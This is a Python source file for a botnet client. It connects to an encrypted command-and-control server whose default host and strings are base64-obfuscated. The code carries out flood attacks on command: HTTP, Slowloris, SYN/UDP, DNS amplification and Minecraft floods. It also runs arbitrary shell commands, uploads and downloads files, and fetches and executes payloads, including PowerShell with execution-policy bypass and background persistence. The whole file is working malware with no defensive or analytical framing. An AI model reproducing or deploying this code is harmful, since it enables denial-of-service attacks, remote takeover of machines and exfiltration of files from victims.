import socket
import time
import json
import logging
import select
import subprocess
import os
import base64
from threading import Thread, Event
from .crypto import Crypto
from .utilities import parse_url, _decode_str
from .utilities import NetworkUtilities, Endpoint
from .logger import getLogger
from .constants import BUFFER_SIZE_LENGTH


# Client Class
class Client:
    def __init__(self, host=_decode_str("MTI3LjAuMC4x"), port=547, debug=False):
        self.server_host = host
        self.server_port = port
        self.crypto = Crypto()
        self.private_key, self.public_key = self.crypto.generate_rsa_keys()
        self.sock = None
        self.redirects = 0
        self.max_redirects = 5
        self.running = True
        self.logger = getLogger("Client", debug)
        self._flood_threads: list[Thread] = []
        self._shutdown_event = Event()

    # Connect to server
    def connect(self):
        while self.running and self.redirects < self.max_redirects:
            try:
                # Create and connect socket
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                self.sock.connect((self.server_host, self.server_port))
                self.sock.settimeout(None)

                # Receive server public key
                length_bytes = self._recv_n_bytes(BUFFER_SIZE_LENGTH)
                if not length_bytes:
                    raise ConnectionError(
                        _decode_str(
                            "RmFpbGVkIHRvIHJlY2VpdmUgc2VydmVyIHB1YmxpYyBrZXkgbGVuZ3Ro"
                        )
                    )
                server_pubkey_len = int.from_bytes(length_bytes, "big")
                server_pubkey_pem = self._recv_n_bytes(server_pubkey_len)
                if not server_pubkey_pem:
                    raise ConnectionError(
                        _decode_str("RmFpbGVkIHRvIHJlY2VpdmUgc2VydmVyIHB1YmxpYyBrZXk=")
                    )

                self.server_public_key = self.crypto.load_public_key(server_pubkey_pem)

                # Send own public key to server
                pubkey_pem = self.crypto.serialize_public_key(self.public_key)
                self.sock.sendall(len(pubkey_pem).to_bytes(BUFFER_SIZE_LENGTH, "big") + pubkey_pem)

                # Send initialization message
                init_message = {
                    _decode_str("cm9sZQ=="): _decode_str("Y2xpZW50")
                }  # Indicates not C2
                init_message_bytes = json.dumps(init_message).encode()
                self.sock.sendall(
                    len(init_message_bytes).to_bytes(BUFFER_SIZE_LENGTH, "big") + init_message_bytes
                )

                # Receive initialization confirmation
                length_bytes = self._recv_n_bytes(BUFFER_SIZE_LENGTH)
                if not length_bytes:
                    raise ConnectionError(
                        _decode_str(
                            "RmFpbGVkIHRvIHJlY2VpdmUgaW5pdCBjb25maXJtYXRpb24gbGVuZ3Ro"
                        )
                    )
                init_len = int.from_bytes(length_bytes, "big")
                init_confirmation = self._recv_n_bytes(init_len)
                if not init_confirmation:
                    raise ConnectionError(
                        _decode_str("RmFpbGVkIHRvIHJlY2VpdmUgaW5pdCBjb25maXJtYXRpb24=")
                    )
                init_data = json.loads(init_confirmation.decode())
                if init_data.get(_decode_str("c3RhdHVz")) != _decode_str(
                    "c3VjY2Vzcw=="
                ):
                    raise ConnectionError(
                        f"{_decode_str('SW5pdGlhbGl6YXRpb24gZmFpbGVkOiA=')} {init_data.get(_decode_str('bWVzc2FnZQ=='))}"
                    )

                # Start listening for messages from server
                self._listen_server()

            except (
                ConnectionRefusedError,
                socket.timeout,
                ConnectionError,
                OSError,
            ) as e:
                self.logger.warning(f"Connection failed: {e}")
                time.sleep(5)
            except json.JSONDecodeError as e:
                self.logger.error(f"Invalid JSON from server: {e}")
                self.close()
                break
            except Exception as e:
                self.logger.error(f"Unexpected error: {e}")
                self.close()
                break
            finally:
                if self.sock:
                    try:
                        self.sock.close()
                    except Exception as e:
                        self.logger.debug(f"Socket close error: {e}")
                    self.sock = None

    def _send_response(self, resp_data: dict) -> None:
        resp_json = json.dumps(resp_data)
        session_key = self.crypto.generate_aes_key()
        encrypted_resp = self.crypto.aes_encrypt(session_key, resp_json.encode())
        encrypted_session_key = self.crypto.rsa_encrypt(
            self.server_public_key, session_key
        )
        payload = (
            len(encrypted_session_key).to_bytes(BUFFER_SIZE_LENGTH, "big")
            + encrypted_session_key
            + len(encrypted_resp).to_bytes(BUFFER_SIZE_LENGTH, "big")
            + encrypted_resp
        )
        self.sock.sendall(payload)

    # Listen for server messages
    def _listen_server(self):
        try:
            while self.running:
                ready, _, _ = select.select([self.sock], [], [], 5)
                if not ready:
                    continue
                # Receive encrypted session key
                length_bytes = self._recv_n_bytes(BUFFER_SIZE_LENGTH)
                if not length_bytes:
                    break
                encrypted_session_key_len = int.from_bytes(length_bytes, "big")
                encrypted_session_key = self._recv_n_bytes(encrypted_session_key_len)
                if not encrypted_session_key:
                    break

                # Receive encrypted message
                length_bytes = self._recv_n_bytes(BUFFER_SIZE_LENGTH)
                if not length_bytes:
                    break
                encrypted_msg_len = int.from_bytes(length_bytes, "big")
                encrypted_msg = self._recv_n_bytes(encrypted_msg_len)
                if not encrypted_msg:
                    break

                # Decrypt message
                session_key = self.crypto.rsa_decrypt(
                    self.private_key, encrypted_session_key
                )
                message = self.crypto.aes_decrypt(session_key, encrypted_msg).decode()

                # Process command
                try:
                    msg_json = json.loads(message)
                    command = msg_json.get(_decode_str("YWN0aW9u"))

                    if command == _decode_str("Zmxvb2Q="):
                        encrypted_ack = self.crypto.rsa_encrypt(
                            self.server_public_key, _decode_str("QUNL").encode()
                        )
                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)

                        data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                        endpoint = parse_url(data.get(_decode_str("dXJs"), ""))
                        if not endpoint:
                            return
                        duration = int(data.get(_decode_str("ZHVyYXRpb24="), 30))
                        method = data.get(_decode_str("bWV0aG9k"), "GET")
                        threads = int(data.get(_decode_str("dGhyZWFkcw=="), 100))

                        net_utils = NetworkUtilities()

                        method_upper = method.upper()
                        is_l7_http = method_upper in (
                            "GET",
                            "POST",
                            "PUT",
                            "DELETE",
                            "HEAD",
                            "SLOWLORIS",
                            "H2RESET",
                            "WS",
                        )
                        is_l4_tcp_udp = method_upper in (
                            "ACK",
                            "SYN",
                            "FIN",
                            "RST",
                            "TCP",
                            "UDP",
                            "DNSAMP",
                        )
                        is_mc_flood = method_upper in (
                            "MCHANDSHAKE",
                            "MCLOGIN",
                            "MCPING",
                        )

                        if is_l7_http or is_l4_tcp_udp or is_mc_flood:
                            t = Thread(
                                target=lambda: net_utils.execute_request_async(
                                    endpoint, duration, method, threads
                                ),
                                daemon=True,
                            )
                            t.start()
                            self._flood_threads.append(t)

                    elif command == _decode_str("cmVkaXJlY3Q="):
                        encrypted_ack = self.crypto.rsa_encrypt(
                            self.server_public_key, _decode_str("QUNL").encode()
                        )
                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)

                        data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                        new_host = data.get(_decode_str("aG9zdA=="))
                        new_port = data.get(_decode_str("cG9ydA=="))
                        if not new_host or not new_port:
                            return
                        self.server_host = new_host
                        self.server_port = new_port
                        self.redirects += 1
                        return

                    elif command == _decode_str("d2FpdA=="):
                        encrypted_ack = self.crypto.rsa_encrypt(
                            self.server_public_key, _decode_str("QUNL").encode()
                        )
                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)

                        data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                        wait_s = data.get(_decode_str("cw=="), 60)
                        time.sleep(wait_s)
                        return

                    elif command == _decode_str("ZXhlYw=="):
                        try:
                            cmd = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("command", "")
                            result = subprocess.run(
                                cmd, shell=True, capture_output=True, text=True, timeout=120
                            )
                            self._send_response({
                                "status": "success",
                                "action": "exec",
                                "stdout": result.stdout,
                                "stderr": result.stderr,
                                "returncode": result.returncode,
                            })
                        except subprocess.TimeoutExpired:
                            self._send_response({
                                "status": "error",
                                "action": "exec",
                                "error": "command timed out",
                            })
                        except Exception as e:
                            self._send_response({
                                "status": "error",
                                "action": "exec",
                                "error": str(e),
                            })

                    elif command == _decode_str("ZG93bmxvYWQ="):
                        try:
                            path = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("path", "")
                            if not os.path.exists(path):
                                raise FileNotFoundError(f"Path not found: {path}")
                            with open(path, "rb") as f:
                                content = base64.b64encode(f.read()).decode()
                            self._send_response({
                                "status": "success",
                                "action": "download",
                                "path": path,
                                "content_b64": content,
                            })
                        except Exception as e:
                            self._send_response({
                                "status": "error",
                                "action": "download",
                                "error": str(e),
                            })

                    elif command == _decode_str("dXBsb2Fk"):
                        try:
                            data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                            path = data.get("path", "")
                            content_b64 = data.get("content_b64", "")
                            content = base64.b64decode(content_b64)
                            os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
                            with open(path, "wb") as f:
                                f.write(content)
                            self._send_response({
                                "status": "success",
                                "action": "upload",
                                "path": path,
                            })
                        except Exception as e:
                            self._send_response({
                                "status": "error",
                                "action": "upload",
                                "error": str(e),
                            })

                    elif command == _decode_str("c2hlbGw="):
                        try:
                            cmd = msg_json.get(_decode_str("ZGF0YQ=="), {}).get("command", "")
                            result = subprocess.run(
                                cmd, shell=True, capture_output=True, text=True, timeout=120
                            )
                            self._send_response({
                                "status": "success",
                                "action": "shell",
                                "stdout": result.stdout,
                                "stderr": result.stderr,
                                "returncode": result.returncode,
                            })
                        except subprocess.TimeoutExpired:
                            self._send_response({
                                "status": "error",
                                "action": "shell",
                                "error": "command timed out",
                            })
                        except Exception as e:
                            self._send_response({
                                "status": "error",
                                "action": "shell",
                                "error": str(e),
                            })

                    elif command == _decode_str("cGF5bG9hZA=="):
                        import tempfile
                        try:
                            data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                            content_b64 = data.get("content_b64", "")
                            filename = data.get("filename", "payload.tmp")
                            payload_type = data.get("type", "bin")
                            timeout = data.get("timeout", 120)
                            persist = data.get("persist", False)
                            args_list = data.get("args", [])
                            background = data.get("background", False)
                            content = base64.b64decode(content_b64)
                            if persist:
                                out_path = os.path.join(os.getcwd(), filename)
                                with open(out_path, "wb") as f:
                                    f.write(content)
                            else:
                                tmp = tempfile.NamedTemporaryFile(delete=False, suffix=f"_{filename}")
                                tmp.write(content)
                                tmp.close()
                                out_path = tmp.name
                            if payload_type in ("elf", "bin", "sh"):
                                os.chmod(out_path, 0o755)
                            if payload_type == "ps1":
                                cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", out_path] + args_list
                            elif payload_type == "sh":
                                cmd = ["bash", out_path] + args_list
                            elif payload_type == "py":
                                cmd = ["python3", out_path] + args_list
                            else:
                                cmd = [out_path] + args_list
                            if background:
                                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                                self._send_response({
                                    "status": "success",
                                    "action": "payload",
                                    "stdout": "[background]",
                                    "stderr": "",
                                    "returncode": 0,
                                })
                            else:
                                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                                if not persist:
                                    try:
                                        os.unlink(out_path)
                                    except OSError:
                                        pass
                                self._send_response({
                                    "status": "success",
                                    "action": "payload",
                                    "stdout": result.stdout,
                                    "stderr": result.stderr,
                                    "returncode": result.returncode,
                                })
                        except subprocess.TimeoutExpired:
                            self._send_response({
                                "status": "error",
                                "action": "payload",
                                "error": "payload timed out",
                            })
                        except Exception as e:
                            self._send_response({
                                "status": "error",
                                "action": "payload",
                                "error": str(e),
                            })

                    else:
                        encrypted_ack = self.crypto.rsa_encrypt(
                            self.server_public_key, _decode_str("QUNL").encode()
                        )
                        self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)

                except KeyError as e:
                    self.logger.debug(f"Unknown command key: {e}")
                    encrypted_ack = self.crypto.rsa_encrypt(
                        self.server_public_key, _decode_str("QUNL").encode()
                    )
                    self.sock.sendall(len(encrypted_ack).to_bytes(BUFFER_SIZE_LENGTH, "big") + encrypted_ack)
                except json.JSONDecodeError as e:
                    self.logger.debug(f"Invalid JSON in command: {e}")

        except Exception as e:
            self.logger.warning(f"Connection listener error: {e}")

        finally:
            if self.sock:
                self.sock.close()
                self.sock = None

    # Helper: Receive exact number of bytes
    def _recv_n_bytes(self, n):
        data = b""
        self.sock.settimeout(10)
        while len(data) < n:
            try:
                chunk = self.sock.recv(n - len(data))
                if not chunk:
                    return None
            except socket.timeout:
                return None
            data += chunk
        return data

    # Close client
    def close(self):
        self.running = False
        self._shutdown_event.set()
        if self.sock:
            self.sock.close()
            self.sock = None
        for t in self._flood_threads:
            t.join(timeout=3)
        self._flood_threads.clear()
